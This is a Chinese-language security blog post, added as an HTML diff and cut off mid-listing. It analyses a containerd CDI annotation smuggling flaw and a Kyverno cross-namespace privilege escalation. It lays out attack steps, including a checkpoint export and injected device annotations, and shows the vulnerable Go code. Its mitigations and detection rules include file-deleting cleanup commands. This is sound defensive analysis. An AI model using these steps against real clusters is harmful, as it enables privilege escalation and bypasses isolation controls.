@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>K8s 控制面双重击穿：containerd CDI 注解走私与 Kyverno 策略生成提权的源码级漏洞分析 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>K8s 控制面双重击穿：containerd CDI 注解走私与 Kyverno 策略生成提权的源码级漏洞分析</h1>
+<time>2026-08-02</time>
+<ul>
+<li>技术
+Slug: k8s控制面双重击穿-containerd-cdi注解走私与kyverno策略生成提权的源码级漏洞分析</li>
+</ul>
+<hr />
+<h2>一、CVE-2026-53492：containerd CRI checkpoint CDI 注解走私</h2>
+<h3>1.1 漏洞基本信息</h3>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE 编号</td>
+<td>CVE-2026-53492</td>
+</tr>
+<tr>
+<td>GitHub Advisory</td>
+<td>GHSA-33vj-92qq-66hc</td>
+</tr>
+<tr>
+<td>CVSS 3.1 (NIST)</td>
+<td><strong>9.6 CRITICAL</strong> — <code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N</code></td>
+</tr>
+<tr>
+<td>CVSS 4.0 (GitHub CNA)</td>
+<td>8.4 HIGH</td>
+</tr>
+<tr>
+<td>CWE</td>
+<td>CWE-20（输入验证不当）、CWE-863（不正确的授权）</td>
+</tr>
+<tr>
+<td>报告者</td>
+<td>Robert Prast (@robertprast)</td>
+</tr>
+<tr>
+<td>发布日期</td>
+<td>2026-06-18（GitHub），2026-07-01（NVD）</td>
+</tr>
+</tbody>
+</table>
+<h3>1.2 受影响版本与修复版本</h3>
+<table>
+<thead>
+<tr>
+<th>版本范围</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&gt;= 2.1.0, &lt; 2.1.9</td>
+<td><strong>受影响</strong></td>
+</tr>
+<tr>
+<td>&gt;= 2.2.0, &lt; 2.2.5</td>
+<td><strong>受影响</strong></td>
+</tr>
+<tr>
+<td>&gt;= 2.3.0, &lt; 2.3.2</td>
+<td><strong>受影响</strong></td>
+</tr>
+<tr>
+<td><strong>2.1.9 / 2.2.5 / 2.3.2</strong></td>
+<td><strong>已修复</strong></td>
+</tr>
+</tbody>
+</table>
+<h3>1.3 漏洞根因：信任边界混淆</h3>
+<p>containerd 的 CRI（Container Runtime Interface）实现在容器恢复（restore）阶段，<strong>不当信任了来自不可信 checkpoint 镜像元数据中的 CDI（Container Device Interface）注解</strong>。</p>
+<p><strong>核心信任模型问题：</strong></p>
+<div class="highlight"><pre><span></span><code>正常容器创建流程（安全）：
+┌──────────────┐     ┌──────────────────────┐     ┌─────────────────┐
+│ Pod 创建请求  │────▶│ K8s API Server       │────▶│ 准入控制器校验   │
+│ (用户可控)    │     │ (RBAC + 准入控制)    │     │ (设备插件强制)   │
+└──────────────┘     └──────────────────────┘     └────────┬────────┘
+                                                           │
+                                                           ▼
+                                                   ┌───────────────┐
+                                                   │ containerd    │
+                                                   │ 创建容器       │
+                                                   │ (安全: 仅使用  │
+                                                   │  准入后规范)   │
+                                                   └───────────────┘
+
+Checkpoint 恢复流程（漏洞）：
+┌──────────────┐     ┌──────────────────────┐     ┌─────────────────┐
+│ Checkpoint   │────▶│ containerd CRI       │────▶│ 恢复容器         │
+│ 镜像元数据    │     │ (恢复阶段)           │     │ (危险: 保留      │
+│ (用户可控!)   │     │ ❌ 不校验CDI注解     │     │  checkpoint中的  │
+│              │     │    直接信任          │     │  恶意CDI注解)    │
+└──────────────┘     └──────────────────────┘     └─────────────────┘
+</code></pre></div>
+
+<p><strong>关键问题</strong>：checkpoint 元数据是<strong>用户可控</strong>的，而设备访问的运行时强制执行是<strong>系统控制</strong>的。containerd 未能在这两个信任边界之间执行安全校验——它保留了 checkpoint 归档中的 CDI 相关注解，而不是仅依赖 Pod 创建时的规范。</p>
+<h3>1.4 CDI（Container Device Interface）背景</h3>
+<p>CDI 是容器设备接口标准，允许在容器中安全地暴露特定设备（GPU、FPGA、SR-IOV NIC 等）：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># CDI 规范示例：暴露 GPU 设备</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cdi.k8s.io/v1alpha1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Device</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">gpu-0</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">containerEdits</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">deviceNodes</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/dev/nvidia0</span>
+<span class="w">    </span><span class="nt">env</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">NVIDIA_VISIBLE_DEVICES</span>
+<span class="w">      </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;0&quot;</span>
+<span class="w">    </span><span class="nt">mounts</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">hostPath</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/usr/lib/x86_64-linux-gnu/libnvidia-ml.so</span>
+<span class="w">      </span><span class="nt">containerPath</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/usr/lib/x86_64-linux-gnu/libnvidia-ml.so</span>
+</code></pre></div>
+
+<p>正常情况下，CDI 注解由 K8s 设备插件在 Pod 创建时通过准入控制器注入，用户无法直接指定。但通过 checkpoint 走私，攻击者可以绕过这一控制。</p>
+<h3>1.5 五步攻击链</h3>
+<div class="highlight"><pre><span></span><code><span class="n">Step</span><span class="w"> </span><span class="mi">1</span><span class="p">:</span><span class="w"> </span><span class="err">初始访问</span>
+<span class="w">  </span><span class="err">攻击者拥有合法的</span><span class="w"> </span><span class="n">Pod</span><span class="w"> </span><span class="err">创建权限（开发者级权限即可）</span>
+
+<span class="n">Step</span><span class="w"> </span><span class="mi">2</span><span class="p">:</span><span class="w"> </span><span class="n">Checkpoint</span><span class="w"> </span><span class="err">创建</span>
+<span class="w">  </span><span class="err">使用</span><span class="w"> </span><span class="n">CRIU</span><span class="w"> </span><span class="err">对容器执行</span><span class="w"> </span><span class="n">checkpoint</span><span class="err">，创建完整状态快照</span>
+<span class="w">  </span><span class="err">┌──────────────────────────────────────────────────┐</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">crictl</span><span class="w"> </span><span class="n">checkpoint</span><span class="w"> </span><span class="o">--</span><span class="k">export</span><span class="o">=</span><span class="n">malicious</span><span class="o">.</span><span class="n">tar</span><span class="w"> </span><span class="o">&lt;</span><span class="n">pod</span><span class="o">-</span><span class="n">id</span><span class="o">&gt;</span><span class="err">│</span>
+<span class="w">  </span><span class="err">└──────────────────────────────────────────────────┘</span>
+
+<span class="n">Step</span><span class="w"> </span><span class="mi">3</span><span class="p">:</span><span class="w"> </span><span class="err">恶意注解注入</span>
+<span class="w">  </span><span class="err">在</span><span class="w"> </span><span class="n">checkpoint</span><span class="w"> </span><span class="err">元数据中构造恶意</span><span class="w"> </span><span class="n">CDI</span><span class="w"> </span><span class="err">注解</span>
+<span class="w">  </span><span class="err">┌──────────────────────────────────────────────────────┐</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="c1"># 修改 checkpoint 元数据                              │</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="c1"># 注入通常在 Pod 创建时会被拒绝的设备访问              │</span>
+<span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">annotations</span><span class="p">:</span><span class="w">                                          </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">cdi</span><span class="o">.</span><span class="n">kubernetes</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">device</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;vendor.com/gpu=all&quot;</span><span class="w">     </span><span class="err">│</span>
+<span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="n">cdi</span><span class="o">.</span><span class="n">kubernetes</span><span class="o">.</span><span class="n">io</span><span class="o">/</span><span class="n">resource</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;nvidia.com/gpu:8&quot;</span><span class="w">     </span><span class="err">│</span>
+<span class="w">  </span><span class="err">└──────────────────────────────────────────────────────┘</span>
+
+<span class="n">Step</span><span class="w"> </span><span class="mi">4</span><span class="p">:</span><span class="w"> </span><span class="err">恢复利用</span>
+<span class="w">  </span><span class="n">containerd</span><span class="w"> </span><span class="err">从</span><span class="w"> </span><span class="n">checkpoint</span><span class="w"> </span><span class="err">恢复容器时，保留</span><span class="w"> </span><span class="n">checkpoint</span><span class="w"> </span><span class="err">归档中的</span>
+<span class="w">  </span><span class="n">CDI</span><span class="w"> </span><span class="err">注解，而非根据</span><span class="w"> </span><span class="n">Pod</span><span class="w"> </span><span class="err">原始创建时规范进行验证</span>
+
+<span class="n">Step</span><span class="w"> </span><span class="mi">5</span><span class="p">:</span><span class="w"> </span><span class="err">安全绕过</span>
+<span class="w">  </span><span class="err">任意</span><span class="w"> </span><span class="n">CDI</span><span class="w"> </span><span class="err">条目被注入，绕过：</span>
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="n">Kubernetes</span><span class="w"> </span><span class="err">设备插件强制执行</span>
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="err">资源配额限制</span>
+<span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="err">命名空间隔离控制</span>
+</code></pre></div>
+
+<h3>1.6 利用前置条件</h3>
+<table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Pod 创建权限</td>
+<td>开发者级访问即可（许多开发工作流中的常见权限）</td>
+</tr>
+<tr>
+<td>containerd 配置</td>
+<td>必须支持容器 checkpointing（用于实时迁移的场景越来越常见）</td>
+</tr>
+<tr>
+<td>CDI 启用</td>
+<td>节点必须启用 CDI，且存在匹配的主机 CDI 规范</td>
+</tr>
+<tr>
+<td><strong>如果 CDI 未启用或缺少敏感设备规范，则不受影响</strong></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3>1.7 缓解措施</h3>
+<p><strong>官方 Workaround：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 如果节点不使用 CDI 功能，从默认目录移除主机 CDI 规范</span>
+<span class="c1"># 这将消除此漏洞的可利用性</span>
+rm<span class="w"> </span>-f<span class="w"> </span>/etc/cdi/*
+rm<span class="w"> </span>-f<span class="w"> </span>/var/run/cdi/*
+
+<span class="c1"># 或者临时迁移到非标准路径</span>
+mv<span class="w"> </span>/etc/cdi<span class="w"> </span>/etc/cdi.disabled
+mv<span class="w"> </span>/var/run/cdi<span class="w"> </span>/var/run/cdi.disabled
+</code></pre></div>
+
+<p><strong>禁用 Checkpoint/Restore：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># /etc/containerd/config.toml</span>
+<span class="k">[plugins.</span><span class="s2">&quot;io.containerd.grpc.v1.cri&quot;</span><span class="k">]</span>
+<span class="w">  </span><span class="c1"># 禁用容器 checkpoint 功能</span>
+<span class="w">  </span><span class="n">enable_criu_support</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span>
+</code></pre></div>
+
+<p><strong>收紧 RBAC：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 移除不必要的 Pod checkpoint 权限</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">rbac.authorization.k8s.io/v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ClusterRole</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">restricted-developer</span>
+<span class="nt">rules</span><span class="p">:</span>
+<span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;pods&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;create&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;get&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;list&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;watch&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="c1"># 不包含 &quot;checkpoint&quot; 操作</span>
+</code></pre></div>
+
+<p><strong>强制 Pod Security Standards：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 强制 restricted 策略</span>
+kubectl<span class="w"> </span>label<span class="w"> </span>--overwrite<span class="w"> </span>ns<span class="w"> </span>production<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>pod-security.kubernetes.io/enforce<span class="o">=</span>restricted
+kubectl<span class="w"> </span>label<span class="w"> </span>--overwrite<span class="w"> </span>ns<span class="w"> </span>production<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>pod-security.kubernetes.io/enforce-version<span class="o">=</span>latest
+</code></pre></div>
+
+<h3>1.8 检测方法</h3>
+<p><strong>SIGMA 规则：检测带有 CDI 注解的 Pod 创建操作</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Detect CDI Annotation Smuggling in containerd Checkpoint Restore</span>
+<span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">experimental</span>
+<span class="nt">logsource</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kubernetes</span>
+<span class="w">  </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">audit</span>
+<span class="nt">detection</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">selection</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">verb</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;create&#39;</span>
+<span class="w">    </span><span class="nt">objectRef</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">resource</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;pods&#39;</span>
+<span class="w">    </span><span class="nt">requestObject</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">metadata</span><span class="p">:</span>
+<span class="w">        </span><span class="nt">annotations|contains</span><span class="p">:</span>
+<span class="w">          </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;cdi.kubernetes.io&#39;</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">selection</span>
+<span class="w">  </span><span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">high</span>
+<span class="w">  </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;</span>
+<span class="w">    </span><span class="no">检测 Pod 创建或恢复操作中包含 CDI 注解的情况，</span>
+<span class="w">    </span><span class="no">可能表明 CVE-2026-53492 的利用尝试</span>
+</code></pre></div>
+
+<p><strong>Auditd 规则：检测 CRIU checkpoint/restore 进程活动</strong></p>
+<div class="highlight"><pre><span></span><code><span class="nt">title</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Detect CRIU Checkpoint/Restore Activity</span>
+<span class="nt">status</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">experimental</span>
+<span class="nt">logsource</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">product</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">linux</span>
+<span class="w">  </span><span class="nt">service</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">auditd</span>
+<span class="nt">detection</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">selection</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">exe|endswith</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;/criu&#39;</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;/containerd-shim-runc-v2&#39;</span>
+<span class="w">    </span><span class="nt">argv|contains</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;restore&#39;</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;dump&#39;</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;checkpoint&#39;</span>
+<span class="w">  </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">selection</span>
+<span class="w">  </span><span class="nt">level</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">medium</span>
+</code></pre></div>
+
+<blockquote>
+<p><strong>重要提醒</strong>：修复后，可能需要<strong>重新创建从不可信 checkpoint 恢复的现有容器</strong>，以移除已走私的配置。</p>
+</blockquote>
+<hr />
+<h2>二、CVE-2026-54523：Kyverno 策略生成跨命名空间权限提升</h2>
+<h3>2.1 漏洞基本信息</h3>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE 编号</td>
+<td>CVE-2026-54523</td>
+</tr>
+<tr>
+<td>GitHub Advisory</td>
+<td>GHSA-79gf-7frw-68m9</td>
+</tr>
+<tr>
+<td>CVSS 3.1</td>
+<td><strong>9.6 CRITICAL</strong> — <code>AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N</code></td>
+</tr>
+<tr>
+<td>报告者</td>
+<td>0xVijay</td>
+</tr>
+<tr>
+<td>发布日期</td>
+<td>2026-07-13（GitHub），2026-07-17（公开报道）</td>
+</tr>
+<tr>
+<td>受影响版本</td>
+<td>&lt;= v1.18.1</td>
+</tr>
+<tr>
+<td>修复版本</td>
+<td><strong>v1.18.2</strong></td>
+</tr>
+<tr>
+<td>复现确认</td>
+<td>2026-05-20 在 kyverno/kyverno main 分支复现</td>
+</tr>
+<tr>
+<td>PoC 状态</td>
+<td><strong>官方 Advisory 含完整 PoC</strong></td>
+</tr>
+</tbody>
+</table>
+<h3>2.2 漏洞根因：GenerateResources 命名空间参数未校验</h3>
+<p><strong>漏洞位置</strong>：<code>pkg/cel/libs/context.go:182</code></p>
+<p><code>GenerateResources(namespace string, dataList []map[string]any)</code> 函数的 <code>namespace</code> 参数<strong>从 CEL 表达式 <code>generator.apply("&lt;target-namespace&gt;", [...])</code> 传入时未经任何验证</strong>，经由 SDK 绑定 <code>github.com/kyverno/sdk cel/libs/generator/impl.go:apply_generator_string_list</code> 到达。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// pkg/cel/libs/context.go:182 — 漏洞函数</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">GenerateResources</span><span class="p">(</span><span class="nx">namespace</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">dataList</span><span class="w"> </span><span class="p">[]</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kt">any</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// ❌ namespace 参数未经任何校验！</span>
+<span class="w">    </span><span class="c1">// 攻击者可以传入任意命名空间，包括 &quot;kube-system&quot;</span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">dataList</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">obj</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">unstructured</span><span class="p">.</span><span class="nx">Unstructured</span><span class="p">{</span><span class="nx">Object</span><span class="p">:</span><span class="w"> </span><span class="nx">data</span><span class="p">}</span>
+<span class="w">        </span><span class="nx">obj</span><span class="p">.</span><span class="nx">SetNamespace</span><span class="p">(</span><span class="nx">namespace</span><span class="p">)</span><span class="w">  </span><span class="c1">// 直接设置为目标命名空间</span>
+<span class="w">        </span><span class="c1">// ... 创建资源</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>2.3 准入校验器的缺陷</h3>
+<p><code>NamespacedGeneratingPolicy</code> 的准入校验器位于 <code>pkg/cel/policies/gpol/validate.go:Validate()</code>，但它<strong>仅检查策略能否编译通过以及 <code>matchConstraints</code> 是否非空</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// pkg/cel/policies/gpol/validate.go — 有缺陷的校验器</span>
+<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">v</span><span class="w"> </span><span class="o">*</span><span class="nx">Validator</span><span class="p">)</span><span class="w"> </span><span class="nx">Validate</span><span class="p">(</span><span class="nx">policy</span><span class="w"> </span><span class="o">*</span><span class="nx">NamespacedGeneratingPolicy</span><span class="p">)</span><span class="w"> </span><span class="nx">field</span><span class="p">.</span><span class="nx">ErrorList</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">errs</span><span class="w"> </span><span class="nx">field</span><span class="p">.</span><span class="nx">ErrorList</span>
+<span class="w">    </span><span class="c1">// ✅ 检查：策略能否编译通过</span>
+<span class="w">    </span><span class="c1">// ✅ 检查：matchConstraints 是否非空</span>
+<span class="w">    </span><span class="c1">// ❌ 缺失：未检查 generator.apply() 的 namespace 参数</span>
+<span class="w">    </span><span class="c1">//          是否与策略自身的命名空间匹配</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">errs</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>2.4 对比正确实现</h3>
+<p>Kyverno 中其他类似功能有正确的防护，但 <code>GenerateResources</code> 缺少：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// pkg/engine/context/loaders/configmap.go:102 — 正确拒绝跨命名空间引用</span>
+<span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">l</span><span class="w"> </span><span class="o">*</span><span class="nx">configMapLoader</span><span class="p">)</span><span class="w"> </span><span class="nx">Load</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">namespace</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">corev1</span><span class="p">.</span><span class="nx">ConfigMap</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">l</span><span class="p">.</span><span class="nx">policyNamespace</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">namespace</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">namespace</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">l</span><span class="p">.</span><span class="nx">policyNamespace</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">&quot;namespaced policy cannot reference configmap from different namespace&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1">// ...</span>
+<span class="p">}</span>
+
+<span class="c1">// pkg/engine/apicall/apicall.go:73-82 — 正确通过正则强制命名空间段匹配</span>
+<span class="kd">func</span><span class="w"> </span><span class="nx">validateNamespace</span><span class="p">(</span><span class="nx">policyNs</span><span class="p">,</span><span class="w"> </span><span class="nx">targetNs</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">pattern</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;^%s$&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">regexp</span><span class="p">.</span><span class="nx">QuoteMeta</span><span class="p">(</span><span class="nx">policyNs</span><span class="p">))</span>
+<span class="w">    </span><span class="nx">matched</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">regexp</span><span class="p">.</span><span class="nx">MatchString</span><span class="p">(</span><span class="nx">pattern</span><span class="p">,</span><span class="w"> </span><span class="nx">targetNs</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">!</span><span class="nx">matched</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">&quot;namespace mismatch&quot;</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h3>2.5 权限基础</h3>
+<p>后台控制器的 ClusterRole（定义在 <code>charts/kyverno/templates/background-controller/clusterrole.yaml</code>）默认拥有对以下资源的<strong>集群级 create/update/patch/delete 权限</strong>：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># charts/kyverno/values.yaml:1436-1457 — 后台控制器权限</span>
+<span class="nt">backgroundController</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">clusterRole</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">extraResources</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;rbac.authorization.k8s.io&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;rolebindings&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;roles&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;create&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;update&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;patch&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;delete&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;networking.k8s.io&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;networkpolicies&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;create&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;update&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;patch&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;delete&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">      </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;configmaps&quot;</span><span class="p p-Indicator">]</span>
